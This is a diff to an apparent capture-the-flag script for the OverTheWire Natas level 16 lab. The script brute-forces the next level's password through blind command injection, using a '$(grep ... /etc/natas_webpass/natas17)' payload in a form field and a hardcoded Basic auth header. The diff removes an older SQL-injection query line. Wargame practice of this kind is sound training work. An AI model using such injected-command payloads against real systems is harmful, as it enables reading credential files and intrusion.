@@ -10,7 +10,6 @@ password = ""
 
 while (len(password) < 32):
     for guess in valid_chars:
-        query = """natas16" and password collate latin1_general_cs like '{}%'; # """.format(password + guess)
         response = requests.post("http://natas16.natas.labs.overthewire.org/index.php",
                                  data={"needle": "$(grep ^{}{} /etc/natas_webpass/natas17)Africans".format(password, guess)},
                                  headers={"Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA===="})
